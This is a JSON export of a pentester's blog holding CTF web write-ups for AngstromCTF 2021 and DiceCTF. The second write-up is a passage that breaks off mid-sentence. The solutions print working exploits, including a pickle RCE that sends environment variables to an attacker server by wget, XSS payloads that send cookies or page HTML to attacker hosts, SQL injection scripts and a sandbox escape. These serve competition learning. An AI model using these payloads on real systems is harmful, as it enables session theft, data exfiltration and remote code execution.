[{"authors":["kahla"],"categories":null,"content":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.\n","date":1566333101,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1566333101,"objectID":"b6c9ad53abeba5bdfba580c41a4e130a","permalink":"https://ahmed-belkahla.me/authors/kahla/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/kahla/","section":"authors","summary":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.","tags":null,"title":"Belkahla Ahmed","type":"authors"},{"authors":["kahla"],"categories":null,"content":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://ahmed-belkahla.me/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.","tags":null,"title":"Belkahla Ahmed","type":"authors"},{"authors":null,"categories":null,"content":"Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn\u0026rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( ! However, I have really liked the web challenges especially the client side ones, we will go through all the tasks so let\u0026rsquo;s begin.\nJar This task was straightforward, as we can see in the source code it\u0026rsquo;s clearly an unsafe pickle deserialization vulnerability\n@app.route('/add', methods=['POST']) def add(): contents = request.cookies.get('contents') if contents: items = pickle.loads(base64.b64decode(contents)) else: items = [] items.append(request.form['item']) response = make_response(redirect('/')) response.set_cookie('contents', base64.b64encode(pickle.dumps(items))) return response  We can generate our payload with the following script to achieve RCE and exfiltrate the flag\nimport pickle,base64 class exploit(object): def __reduce__(self): import os return (os.system,('wget https://SERVER/?a=`env|base64|tr -d \u0026quot;\\n\u0026quot;`',)) base64.b64encode(pickle.dumps(exploit()))  Then we only have to change contents cookie with our payload :D\nSea of Quills  As we can see in the source code it\u0026rsquo;s an SQL injection with some filters.\npost '/quills' do db = SQLite3::Database.new \u0026quot;quills.db\u0026quot; cols = params[:cols] lim = params[:limit] off = params[:offset] blacklist = [\u0026quot;-\u0026quot;, \u0026quot;/\u0026quot;, \u0026quot;;\u0026quot;, \u0026quot;'\u0026quot;, \u0026quot;\\\u0026quot;\u0026quot;] blacklist.each { |word| if cols.include? word return \u0026quot;beep boop sqli detected!\u0026quot; end } if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off) return \u0026quot;bad, no quills for you!\u0026quot; end @row = db.execute(\u0026quot;select %s from quills limit %s offset %s\u0026quot; % [cols, lim, off]) p @row erb :specific end  we can inject the following in cols part to get our flag (after performing the usual steps to find the column and table name)\n1,flag,2 from flagtable union select 1,2,3  And Bingo we got our flag\nnomnomnom It was a client-side task, our goal is to leak the admin page\u0026rsquo;s source code in order to get the flag so we have to find a way and get an XSS. Reviewing the source code we can spot a possible injection sink in the share name but unfortunately the page is protected with a strict CSP , the only way to execute javascript (as far as I know) is using the nonce value which is randomly generated on every request.\napp.get('/shares/:shareName', function(req, res) { // TODO: better page maybe...? would attract those sweet sweet vcbucks if (!(req.params.shareName in shares)) { return res.status(400).send('hey that share doesn\\'t exist... are you a time traveller :O'); } const share = shares[req.params.shareName]; const score = share.score; const name = share.name; const nonce = crypto.randomBytes(16).toString('hex'); let extra = ''; if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) { extra = `deletion token: \u0026lt;code\u0026gt;${process.env.FLAG}\u0026lt;/code\u0026gt;` } return res.send(` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv='Content-Security-Policy' content=\u0026quot;script-src 'nonce-${nonce}'\u0026quot;\u0026gt; \u0026lt;title\u0026gt;snek nomnomnom\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; ${extra}${extra ? '\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;' : ''} \u0026lt;h2\u0026gt;snek goes \u0026lt;em\u0026gt;nomnomnom\u0026lt;/em\u0026gt;\u0026lt;/h2\u0026gt;\u0026lt;br /\u0026gt; Check out this score of ${score}! \u0026lt;br /\u0026gt; \u0026lt;a href='/'\u0026gt;Play!\u0026lt;/a\u0026gt; \u0026lt;button id='reporter'\u0026gt;Report.\u0026lt;/button\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; This score was set by ${name} \u0026lt;script nonce='${nonce}'\u0026gt; function report() { fetch('/report/${req.params.shareName}', { method: 'POST' }); } document.getElementById('reporter').onclick = () =\u0026gt; { report() }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;`); });  The first thing I tried was using markup dangling technique in order to leak the nonce and reuse it maybe but it was not possible in this case . After some tries and fails I thought that maybe if I can abuse the already written nonce and somehow include it in a script tag I inject. Injecting the following payload in the share\u0026rsquo;s name will lead us to use the nonce with our own src attribute\n\u0026lt;script src=http://SERVER/app.js  How it\u0026rsquo;s interpreted:\nAnd we host app.js file on our server with the following content , the bot didn\u0026rsquo;t have fetch api so I used XMLHttpRequest.\nfunction httpGet(theUrl) { var xmlHttp = new XMLHttpRequest(); xmlHttp.open( \u0026quot;GET\u0026quot;, theUrl, false ); // false for synchronous request xmlHttp.send( null ); return xmlHttp.responseText; } httpGet(\u0026quot;https://webhook.site/b494ae6c-c6f2-4ea2-b915-47e22ed4c076/?a=\u0026quot;+btoa(document.body.innerHTML));  Finally you only have to report the share to the admin and get the beloved flag :D\nReaction.py We are provided with the source code of the website, it\u0026rsquo;s a simple website with a register and login functionalities, after registering you will have a page where you can crete some predefined modules. This the most interesting function:\ndef add_component(name, cfg, bucket): if not name or not cfg: return (ERR, \u0026quot;Missing parameters\u0026quot;) if len(bucket) \u0026gt;= 2: return (ERR, \u0026quot;Bucket too large (our servers aren't very good :((((()\u0026quot;) if len(cfg) \u0026gt; 250: return (ERR, \u0026quot;Config too large (our servers aren't very good :((((()\u0026quot;) if name == \u0026quot;welcome\u0026quot;: if len(bucket) \u0026gt; 0: return (ERR, \u0026quot;Welcomes can only go at the start\u0026quot;) bucket.append( \u0026quot;\u0026quot;\u0026quot; \u0026lt;form action=\u0026quot;/newcomp\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; placeholder=\u0026quot;component name\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;cfg\u0026quot; placeholder=\u0026quot;component config\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;create component\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;form action=\u0026quot;/reset\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;p\u0026gt;warning: resetting components gets rid of this form for some reason\u0026lt;/p\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;reset components\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;form action=\u0026quot;/contest\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;g-recaptcha\u0026quot; data-sitekey=\u0026quot;{}\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;submit site to contest\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p\u0026gt;Welcome \u0026lt;strong\u0026gt;{}\u0026lt;/strong\u0026gt;!\u0026lt;/p\u0026gt; \u0026quot;\u0026quot;\u0026quot;.format( captcha.get(\u0026quot;sitekey\u0026quot;), escape(cfg) ).strip() ) elif name == \u0026quot;char_count\u0026quot;: bucket.append( \u0026quot;\u0026lt;p\u0026gt;{}\u0026lt;/p\u0026gt;\u0026quot;.format( escape( f\u0026quot;\u0026lt;strong\u0026gt;{len(cfg)}\u0026lt;/strong\u0026gt; characters and \u0026lt;strong\u0026gt;{len(cfg.split())}\u0026lt;/strong\u0026gt; words\u0026quot; ) ) ) elif name == \u0026quot;text\u0026quot;: bucket.append(\u0026quot;\u0026lt;p\u0026gt;{}\u0026lt;/p\u0026gt;\u0026quot;.format(escape(cfg))) elif name == \u0026quot;freq\u0026quot;: counts = Counter(cfg) (char, freq) = max(counts.items(), key=lambda x: x[1]) bucket.append( \u0026quot;\u0026lt;p\u0026gt;All letters: {}\u0026lt;br\u0026gt;Most frequent: '{}'x{}\u0026lt;/p\u0026gt;\u0026quot;.format( \u0026quot;\u0026quot;.join(counts), char, freq ) ) else: return (ERR, \u0026quot;Invalid component name\u0026quot;) return (OK, bucket)  We can notice that we can only submit two modules, we have a reset feature to wipe all the created modules and all our input is well sanitized except all the letters used in freq module. Taking into consideration all the constraints we have, we can only inject two times (because of the maximum number of modules), the non sanitized input is passed to Collectons.Counter so every duplicated character will be removed which prevent us from injecting all the payload .\nBurp request to reset the modules:\nI started struggling a little bit here and tried passing the component config as an array (I noticed when testing locally that when passing an array to Collections.Counter it won\u0026rsquo;t remove dup chars) but it didn\u0026rsquo;t lead me anywhere.\nAfter watching some anime, I took another look at the challenge and got the idea to split my payload and inject it separately in the two modules, firstly we can inject \u0026lt;script\u0026gt;/* in the freq module ( Input is not sanitized so we can safely open a script tag) and the /* to comment all the garbage between the two modules and then inject our second payload */function r(u){var c=new XMLHttpRequest();c.withCredentials=true;c.open(`GET`,u,false);c.send(null);return c.responseText;}var b=r(`http://127.0.0.1:8080/?fakeuser=admin`);fetch(`https://SERVER/?a=`%2Bbtoa(b));//  in text module ( we have to make sure that it will not contain any characters that can be escaped ). I used the backtick instead of the quotation marks.\nThis is the final result after injecting:\nFinally to report our page to the admin we had to manually add the report form and the script tag of the recaptcha. After visiting our page we receive the source code containing the flag:\nSea of Quills 2 ## This was a second version of the first SQL injection task but with more strict filters, this is the most interesting part of the source code:\npost '/quills' do db = SQLite3::Database.new \u0026quot;quills.db\u0026quot; cols = params[:cols] lim = params[:limit] off = params[:offset] blacklist = [\u0026quot;-\u0026quot;, \u0026quot;/\u0026quot;, \u0026quot;;\u0026quot;, \u0026quot;'\u0026quot;, \u0026quot;\\\u0026quot;\u0026quot;, \u0026quot;flag\u0026quot;] blacklist.each { |word| if cols.include? word return \u0026quot;beep boop sqli detected!\u0026quot; end } puts \u0026quot;select %s from quills limit %s offset %s\u0026quot; % [cols, lim, off] if cols.length \u0026gt; 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off) return \u0026quot;bad, no quills for you!\u0026quot; end puts \u0026quot;select %s from quills limit %s offset %s\u0026quot; % [cols, lim, off] @row = db.execute(\u0026quot;select %s from quills limit %s offset %s\u0026quot; % [cols, lim, off]) p @row erb :specific end  The most attentive readers may have noticed that cols parameter length is limited to 24 characters now and it can\u0026rsquo;t include the word flag :( The first idea I got is to try passing an array to cols parameter in order to bypass the filters but unfortunately I couldn\u0026rsquo;t get rid of the brackets that were causing an sqlite error. This is the resulting SQL query after passing cols as an array ( cols[]=input ):\nselect [\u0026quot;input\u0026quot;] from quills limit 10 offset 0  After some fails I remembered that regex matching in ruby can be broken using \\n , I was so dumb to forget something this important. I opted to the following payload in limit parameter to perform a blind SQL injection:\n10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20\u0026quot;{sub}\u0026quot;%20);  %0a to break the regex and escape it , then we will iterate over all the characters of the flag , if we have a correct letter the response will contain the values passed in cols as mentioned in the picture below :\nThis is my final exploit to exfiltrate the flag char by char:\nimport string,requests from urllib.parse import unquote data={\u0026quot;offset\u0026quot;:\u0026quot;7\u0026quot;,\u0026quot;cols\u0026quot;:\u0026quot;999999999,5,6\u0026quot;} url=\u0026quot;https://seaofquills-two.2021.chall.actf.co/quills\u0026quot; chars=string.printable flag=\u0026quot;\u0026quot; i=36 print(\u0026quot;[+] Started\u0026quot;) while \u0026quot;}\u0026quot; not in flag: for char in chars: payload='10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20\u0026quot;{sub}\u0026quot;%20);'.format(count=str(i),sub=char) data[\u0026quot;limit\u0026quot;]=unquote(payload) r=requests.post(url,data=data) if \u0026quot;999999999\u0026quot; in r.text: flag=flag+char i=i+1 print(\u0026quot;[+] \u0026quot;+flag) break  Spoofy We are given the source code as always ( Best thing about this CTF ), we have to pass the following check in order to get the flag.\nif \u0026quot;X-Forwarded-For\u0026quot; in request.headers: # https://stackoverflow.com/q/18264304/ # Some people say first ip in list, some people say last # I don't know who to believe # So just believe both ips: List[str] = request.headers[\u0026quot;X-Forwarded-For\u0026quot;].split(\u0026quot;, \u0026quot;) if not ips: return text_response(\u0026quot;How is it even possible to have 0 IPs???\u0026quot;, 400) if ips[0] != ips[-1]: return text_response( \u0026quot;First and last IPs disagree so I'm just going to not serve this request.\u0026quot;, 400, ) ip: str = ips[0] if ip != \u0026quot;1.3.3.7\u0026quot;: return text_response(\u0026quot;I don't trust you \u0026gt;:(\u0026quot;, 401) return text_response(\u0026quot;Hello 1337 haxx0r, here's the flag! \u0026quot; + FLAG) else: return text_response(\u0026quot;Please run the server through a proxy.\u0026quot;, 400)  The application is hosted in Heroku , in fact heroku will append your real ip to the X-Forwarded-For header so it seems impossible to satisfy the mentioned conditions since our real ip is not 1.3.3.7 . The bypass is simple , we can pass the X-Forwarded-For header twice and heroku\u0026rsquo;s router will append our real ip to the first one then the two headers will be concatenated :D\nJason I have particularly enjoyed this challenge but I was really stupid and solved it just after the CTF ended. In fact the admin bot was using headless chrome and I was testing my exploit on firefox which had a different behaviour :( We have the source code as always , the website is simple we have a report functionality and a simple passcode keyboard.\nconst jason = require('./jason') const express = require('express') const bodyParser = require('body-parser') const cookieParser = require('cookie-parser') const app = express() function sameOrigin (req, res, next) { if (req.get('referer') \u0026amp;\u0026amp; !req.get('referer').startsWith(process.env.URL)) return res.sendStatus(403) return next() } app.use(bodyParser.urlencoded({ extended: false })) app.use(cookieParser()) app.use(express.static('public')) app.post('/passcode', function (req, res) { if (req.body.passcode === 'CLEAR') res.append('Set-Cookie', 'passcode=') else res.append('Set-Cookie', `passcode=${(req.cookies.passcode || '')+req.body.passcode}`) return res.redirect('/') }) app.post('/visit', async function (req, res) { if (req.body.site.startsWith('http')) try {await jason.visit(req.body.site) } catch (e) {console.log(e)} return res.redirect('/') }) app.get('/languages', sameOrigin, function (req, res) { res.jsonp({category: 'languages', items: ['C++', 'Rust', 'OCaml', 'Lisp', 'Physical touch']}) }) app.get('/friends', sameOrigin, function (req, res) { res.jsonp({category: 'friends', items: ['Functional programming']}) }) app.get('/flags', sameOrigin, function (req, res) { if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403) res.jsonp({category: 'flags', items: [process.env.FLAG]}) }) app.listen(7331)  We can notice that we have to find a way to load the /flags jsonp endpoint so we have to bypass firstly the sameOrigin middleware check and find a way to send the passcode cookie in the cross origin request. The first check about sameOrigin is easy to bypass if we set referrer-policy to no-referrer, the problem is the second part about cookies because the default behaviour of chrome is to set the SameSite attribute to lax if no SameSite attribute is specified which prevents sending cookies in cross origin requests ( More Details ).\nWe can notice that we have a possible injection in Set-Cookie response header so we can inject ;SameSite=None; Secure in order to permit cookies to be sent in cross site requests. There is a little piece missing which is how to send the post request in order to inject the SameSite attribute, the idea here is to opt to Lax + POST mitigation which enables the cookie to be sent on a top-level cross-site POST request as you can see in the link provided.\nLet\u0026rsquo;s recapitulate , our chain will be as following:\nFirst we send a post request to /passcode from a top level window in order to inject ;SameSite=None; Secure then we call script tag with a src as /flags and referrer-policy set to no-referrer, This was my final exploit:\nfrom flask import Flask import time app = Flask(__name__) @app.route('/delay') def delay(): time.sleep(9) return \u0026quot;zeu\u0026quot; @app.route('/form') def form(): return \u0026quot;\u0026quot;\u0026quot; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method='post' id='hack' action='https://jason.2021.chall.actf.co/passcode'\u0026gt; \u0026lt;input type='text' name='passcode' value=';SameSite=None; Secure'\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.getElementById('hack').submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026quot;\u0026quot;\u0026quot; @app.route('/flag') def flag(): return \u0026quot;\u0026quot;\u0026quot; \u0026lt;html\u0026gt; \u0026lt;meta name='referrer' content='no-referrer'\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; function load(data){ fetch(\u0026quot;http://SERVER?a=\u0026quot;+data.items.map(i =\u0026gt; i).join('')); } var s=document.createElement(\u0026quot;script\u0026quot;); s.src=\u0026quot;https://jason.2021.chall.actf.co/flags?callback=load\u0026quot;; document.body.appendChild(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026quot;\u0026quot;\u0026quot; @app.route('/') def index(): return \u0026quot;\u0026quot;\u0026quot; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026quot;/delay\u0026quot;/\u0026gt; \u0026lt;script\u0026gt; var w=window.open(\u0026quot;/form\u0026quot;,\u0026quot;win\u0026quot;); window.open(\u0026quot;/flag\u0026quot;,\u0026quot;hah\u0026quot;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026quot;\u0026quot;\u0026quot; if __name__==\u0026quot;__main__\u0026quot;: app.run(port=1234, host=\u0026quot;0.0.0.0\u0026quot;)  And bingo we get our flag :\nUnfortunately I couldn\u0026rsquo;t try the last two challenges because of the lack of time ( school is the worst ) :'( I have really enjoyed the tasks especially the client side ones so kudos to the authors for these well designed challenges ! I hope you learned from the writeup , feel free to dm me on twitter if you have any questions!\n","date":1618100400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1618100400,"objectID":"ba4b1dcc6784523c10a9fdeba3bbd0d8","permalink":"https://ahmed-belkahla.me/post/angstromctf_web/","publishdate":"2021-04-11T00:20:00Z","relpermalink":"/post/angstromctf_web/","section":"post","summary":"Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn\u0026rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !","tags":null,"title":"AngstromCTF Web Writeups","type":"post"},{"authors":null,"categories":null,"content":"Hello everybody , it has been a long time since I have posted a writeup :( I have been a little busy in the last period with school assignments, exams and some work (Covid has really messed up my life). After a little break I had fun participating in Dice CTF which had some great client side challenges, we will explore them in details in this article , we assume you have a background about basic client side attacks, so let\u0026rsquo;s start our ride now. (Challenges are still up, you can try them  HERE or follow along with me)\nSummary 1- Client Side chaining attacks\n2- Babier CSP\n3- Missing Flavortext\n4- Web Utils\n5- Build a Panel\n6- Web IDE\n7- Watermark as a Service\n8- Build a Better Panel\nClient Side Chaining Attacks Generally client side bugs alone have a low impact , but with the great research going on it\u0026rsquo;s possible to chain multiple bugs together and get a higher impact, a simple reflected XSS can now lead to account takeover if it\u0026rsquo;s chained with some other bugs. The last CTFs have been focusing on this techniques and DiceCTF was not an exception , it had great tasks that required chaining multiple bugs to get the flag.\nBabier CSP The website is simple and has an obvious reflected XSS but it was protected with a strict CSP (Content Security Policy). Firstly I didn\u0026rsquo;t notice the source code that was provided with the task so I tried to find a way to bypass the CSP\ndefault-src none; script-src 'nonce-g+ojjmb9xLfE+3j9PsP/Ig==';\r In fact, if we focus a little bit you can see that none is not situated between two quotation marks so it will be interpreted as the hostname \u0026ldquo;none\u0026rdquo; , I played a little bit with this but i reached a dead end :'( Fortunately when I saw the source code it was obvious that the nonce is only generated once so we can reuse it.\nconst express = require('express');\rconst crypto = require(\u0026quot;crypto\u0026quot;);\rconst config = require(\u0026quot;./config.js\u0026quot;);\rconst app = express()\rconst port = process.env.port || 3000;\rconst SECRET = config.secret;\rconst NONCE = crypto.randomBytes(16).toString('base64');\rconst template = name =\u0026gt; `\r\u0026lt;html\u0026gt;\r${name === '' ? '': `\u0026lt;h1\u0026gt;${name}\u0026lt;/h1\u0026gt;`}\r\u0026lt;a href='#' id=elem\u0026gt;View Fruit\u0026lt;/a\u0026gt;\r\u0026lt;script nonce=${NONCE}\u0026gt;\relem.onclick = () =\u0026gt; {\rlocation = \u0026quot;/?name=\u0026quot; + encodeURIComponent([\u0026quot;apple\u0026quot;, \u0026quot;orange\u0026quot;, \u0026quot;pineapple\u0026quot;, \u0026quot;pear\u0026quot;][Math.floor(4 * Math.random())]);\r}\r\u0026lt;/script\u0026gt;\r\u0026lt;/html\u0026gt;\r`;\rapp.get('/', (req, res) =\u0026gt; {\rres.setHeader(\u0026quot;Content-Security-Policy\u0026quot;, `default-src none; script-src 'nonce-${NONCE}';`);\rres.send(template(req.query.name || \u0026quot;\u0026quot;));\r})\rapp.use('/' + SECRET, express.static(__dirname + \u0026quot;/secret\u0026quot;));\rapp.listen(port, () =\u0026gt; {\rconsole.log(`Example app listening at http://localhost:${port}`)\r})\r So Our last payload that we will send to the admin bot is:\nhttps://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%22LRGWAXOY98Es0zz0QOVmag==%22%3Edocument.location=%22https://fword.wtf/?a=%22%2Bdocument.cookie;%3C/script%3E\r PS: I used window.location because of default-src attribute in CSP so we can only use fetch for example with the hostname none.\nMissing Flavortext The website is a simple login page and we have the source code\napp.use(bodyParser.urlencoded({ extended: true }));\rapp.use(express.static('static'));\r// login route\rapp.post('/login', (req, res) =\u0026gt; {\rif (!req.body.username || !req.body.password) {\rreturn res.redirect('/');\r}\rif ([req.body.username, req.body.password].some(v =\u0026gt; v.includes('\\''))) {\rreturn res.redirect('/');\r}\r// see if user is in database\rconst query = `SELECT id FROM users WHERE\rusername = '${req.body.username}' AND\rpassword = '${req.body.password}'\r`;\rlet id;\rtry { id = db.prepare(query).get()?.id } catch {\rreturn res.redirect('/');\r}\r// correct login\rif (id) return res.sendFile('flag.html', { root: __dirname });\r// incorrect login\rreturn res.redirect('/');\r});\rapp.listen(3000);\r We can easily notice the sql injection in this piece of code\nconst query = `SELECT id FROM users WHERE\rusername = '${req.body.username}' AND\rpassword = '${req.body.password}'\r`;\r But there is a simple filter that is blacklisting the quotation mark:\nif ([req.body.username, req.body.password].some(v =\u0026gt; v.includes('\\''))) {\rreturn res.redirect('/');\r}\r Let\u0026rsquo;s focus on bypassing the filter , I encountered this type of check algorithms a lot in previous CTFs so after seeing  app.use(bodyParser.urlencoded({ extended: true })); I knew that we will try to use arrays to trick the filter. When the extended attribute of bodyparser is set to True we can use any type in the request parameters (When it\u0026rsquo;s set to false we can only use strings or arrays). \u0026ldquo;Includes\u0026rdquo; function can be used for arrays and strings so if we pass the password as an array we will be able to bypass the filter. (I covered this technique in more details in the following  writeup) . Finally running the following command we will get our flag:\ncurl -d \u0026quot;username=admin\u0026amp;password[]='or 1=1 -- -\u0026quot; https://missing-flavortext.dicec.tf/login\r Web Utils We have a website that have link sortener and pastebin functionalities, our goal is to steal the admin cookies so the first thing I thinked about is finding an XSS.\nAfter exploring the existing fields in the website there was no obvious XSS, while I was exploring the source code I had the idea to try shortening a url of the following form javascript:alert(1); but there was a regex expression filtering the url format.\nmodule.exports = async (fastify) =\u0026gt; {\rfastify.post('createLink', {\rhandler: (req, rep) =\u0026gt; {\rconst uid = database.generateUid(8);\rconst regex = new RegExp('^https?://');\rif (! regex.test(req.body.data))\rreturn rep\r.code(200)\r.header('Content-Type', 'application/json; charset=utf-8')\r.send({\rstatusCode: 200,\rerror: 'Invalid URL'\r});\r But focusing more on the source code we can notice this piece of code in the CreatePaste endpoint :\nfastify.post('createPaste', {\rhandler: (req, rep) =\u0026gt; {\rconst uid = database.generateUid(8);\rdatabase.addData({ type: 'paste', ...req.body, uid });\rrep\r.code(200)\r.header('Content-Type', 'application/json; charset=utf-8')\r.send({\rstatusCode: 200,\rdata: uid\r});\r},\r The following line is pretty juicy\ndatabase.addData({ type: 'paste', ...req.body, uid });\r Any parameter we will send in the request\u0026rsquo;s body will be passed to the addData function so we can change the type of the added data to \u0026ldquo;link\u0026rdquo; and get rid of the regex expression in the CreateLink endpoint, so the payload will be :\ncurl --header \u0026quot;Content-Type: application/json\u0026quot; \\\r--request POST \\\r--data '{\u0026quot;type\u0026quot;:\u0026quot;link\u0026quot;,\u0026quot;data\u0026quot;:\u0026quot;javascript:fetch(\\\u0026quot;https://\u0026lt;Domain\u0026gt;?a=\\\u0026quot;+document.cookie);\u0026quot;}' https://web-utils.dicec.tf/api/createPaste\r After that we send the paste link https://web-utils.dicec.tf/view/HW9BHr0a to the admin bot and we get the cookie in our controlled web server (You can use webhook.site for example).\nBuild a Panel The website is simple , you can create a panel and add some widgets in it . After analysing the provided source code we can notice that the flag is in the database.\ndb.run(query);\rquery = `CREATE TABLE IF NOT EXISTS flag (\rflag TEXT\r)`;\rdb.run(query, [], (err) =\u0026gt; {\rif(!err){\rlet innerQuery = `INSERT INTO flag SELECT 'dice{fake_flag}'`;\rdb.run(innerQuery);\r}else{\rconsole.error('Could not create flag table');\r}\r});\r The following piece code looks interesting , we can see the SQL injection vulnerability but unfortunately this endpoint is only accessible by the admin\napp.get('/admin/debug/add_widget', async (req, res) =\u0026gt; {\rconst cookies = req.cookies;\rconst queryParams = req.query;\rif(cookies['token'] \u0026amp;\u0026amp; cookies['token'] == secret_token){\rquery = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;\rdb.run(query, (err) =\u0026gt; {\rif(err){\rconsole.log(err);\rres.send('something went wrong');\r}else{\rres.send('success!');\r}\r});\r}else{\rres.redirect('/');\r}\r});\rapp.listen(31337, () =\u0026gt; {\rconsole.log('express listening on 31337')\r});\r So what if we send the link having our SQL injection payload to the admin so it will be executed as the admin and we can bypass the following check\nif(cookies['token'] \u0026amp;\u0026amp; cookies['token'] == secret_token)\r For the SQL injection part we will use the subqueries to create a widget in our panel with a title having the flag , our final payload that we will send to the admin bot is :\nhttps://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=\u0026lt;Your-Panel-ID\u0026gt;', (select flag from flag limit 1), '1');--\u0026amp;widgetname=a\u0026amp;widgetdata=a\r And Bingo our beloved flag is there :D\nWeb IDE The website is a simple IDE to run javascript code in a sandboxed environment, we have the source code as usual .\nAfter analysing the code we can notice that the flag is in the admin cookie so obviously our goal will be to steal it\ncase 'admin':\rif (password === adminPassword)\rreturn res.cookie('token', `dice{${process.env.FLAG}}`, {\rpath: '/ide',\rsameSite: 'none',\rsecure: true\r}).redirect('/ide/');\rbreak;\r}\rres.status(401).end();\r The restrictions that are set up are the following:\napp.use('/', (req, res, next) =\u0026gt; {\rres.setHeader('X-Frame-Options', 'DENY');\rreturn next();\r});\r// sandbox the sandbox\rapp.use('/sandbox.html', (req, res, next) =\u0026gt; {\rres.setHeader('Content-Security-Policy', 'frame-src \\'none\\'');\r// we have to allow this for obvious reasons\rres.removeHeader('X-Frame-Options');\rreturn next();\r});\r I tried to think about a possible scenario in order to achieve xss, the first thing was to try to bypass the sandbox so let\u0026rsquo;s take a look at its code in sandbox.js:\nconst safeEval = (d) =\u0026gt; (function (data) {\rwith (new Proxy(window, {\rget: (t, p) =\u0026gt; {\rif (p === 'console') return { log };\rif (p === 'eval') return window.eval;\rreturn undefined;\r}\r})) {\reval(data);\r}\r}).call(Object.create(null), d);\r The page is listening for a postmessage , once received it execute safeEval function that is acting as a proxy, we can see that entering eval will return window.eval so what about using eval\u0026rsquo;s constructor to execute our js code freely: eval.constructor(\u0026quot;console.log(1);\u0026quot;)() will print 1 in the console so our code is executed. We need now to get the cookie from /ide path since the admin cookie\u0026rsquo;s path is set like the following\n{\rpath: '/ide',\rsameSite: 'none',\rsecure: true\r}\r For this i used window.open in order to open https://web-ide.dicec.tf/ide/ and access the dom from the window reference , this is only possible because we are not violating the same origin policy and opening the window from the same origin . Let\u0026rsquo;s wrap the things up now, we will create a webpage that when the admin visits it, we will send a postmessage to the sandbox ( that\u0026rsquo;s why you have to check the origin when you are using postmessages ) and open a window of https://web-ide.dicec.tf/ide/ and send the cookie to our controlled website. The final payload code :\n\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;PoC\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;iframe id=\u0026quot;vuln\u0026quot; src=\u0026quot;https://web-ide.dicec.tf/sandbox.html\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\r\u0026lt;script\u0026gt;\rsetTimeout(\r()=\u0026gt;{document.getElementById(\u0026quot;vuln\u0026quot;).contentWindow.postMessage(\u0026quot;eval.constructor(\\\u0026quot;var w=window.open('https://web-ide.dicec.tf/ide/');setTimeout(()=\u0026gt;{window.location='https://\u0026lt;Your-Domain\u0026gt;?a='+btoa(w.document.cookie);},2000);\\\u0026quot;)();\u0026quot;,\u0026quot;*\u0026quot;)}\r,2000);\r\u0026lt;/script\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r We only have to host this page on our server and send the link to the admin bot . This was an unintended solution , the intended one is abusing service workers and navigator.sendBeacon in order to steal the cookie , you can check more details  HERE .\nI enjoyed this task the most and it required me some time that\u0026rsquo;s why 